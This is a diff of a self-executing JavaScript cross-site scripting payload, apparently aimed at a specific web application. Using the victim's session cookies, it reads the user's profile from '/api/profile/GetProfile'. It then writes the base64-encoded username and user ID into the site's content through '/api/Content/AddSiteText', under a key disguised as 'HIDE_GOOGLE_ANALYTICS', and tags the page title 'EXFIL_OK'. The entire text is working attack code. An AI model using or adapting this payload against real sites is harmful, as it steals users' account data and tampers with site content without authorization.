@@ -1,51 +1,35 @@
 (function () {
   try {
-    var req1 = new XMLHttpRequest();
-
-    req1.open('GET', '/api/profile/GetProfile', true);
-    req1.withCredentials = true;
-    req1.setRequestHeader('X-Requested-With', 'XMLHttpRequest');
-
-    req1.onload = function () {
+    var xhr = new XMLHttpRequest();
+    xhr.open('GET', '/api/profile/GetProfile', true);
+    xhr.withCredentials = true;
+    xhr.setRequestHeader('X-Requested-With', 'XMLHttpRequest');
+    xhr.onload = function () {
       try {
-        if (req1.status < 200 || req1.status >= 300) {
-          document.title = '[HEALTH_GET_' + req1.status + '] ' + document.title;
-          return;
-        }
+        var data = JSON.parse(xhr.responseText);
+        var uname = data.userData.userName || 'empty';
+        var proof = 'XSS_PROOF:' + uname + ':' + data.userData.userID;
 
-        var value = btoa(req1.responseText || 'unknown');
-        var ts = Date.now();
-
-        var body = JSON.stringify({
-          name: 'HIDE_GOOGLE_ANALYTICS',
-          langId: 1,
-          brandId: 68,
-          stringValue: value
-        });
-
-        var req2 = new XMLHttpRequest();
-        req2.open('POST', '/api/Content/AddSiteText', true);
-        req2.withCredentials = true;
-        req2.setRequestHeader('Content-Type', 'application/json');
-        req2.setRequestHeader('X-Requested-With', 'XMLHttpRequest');
-
-        req2.onload = function () {
-          document.title = '[XSS_PROVEN_' + ts + '] ' + document.title;
+        var post = new XMLHttpRequest();
+        post.open('POST', '/api/Content/AddSiteText', true);
+        post.withCredentials = true;
+        post.setRequestHeader('Content-Type', 'application/json');
+        post.setRequestHeader('X-Requested-With', 'XMLHttpRequest');
+        post.onload = function () {
+          try { document.title = '[EXFIL_OK_' + uname + '] ' + document.title; } catch (e) {}
         };
-
-        req2.send(body);
+        post.send(JSON.stringify({
+          name:        'HIDE_GOOGLE_ANALYTICS',
+          langId:      1,
+          brandId:     68,
+          stringValue: btoa(proof)
+        }));
       } catch (e) {
-        document.title = '[XSS_ERR] ' + document.title;
+        try { document.title = '[PARSE_ERR] ' + document.title; } catch (ee) {}
       }
     };
-
-    req1.onerror = function () {
-      document.title = '[HEALTH_GET_ERR] ' + document.title;
-    };
-
-    req1.send();
+    xhr.send();
   } catch (e) {
-    document.title = '[XSS_ERR] ' + document.title;
+    try { document.title = '[XSS_ERR] ' + document.title; } catch (ee) {}
   }
 })();
-
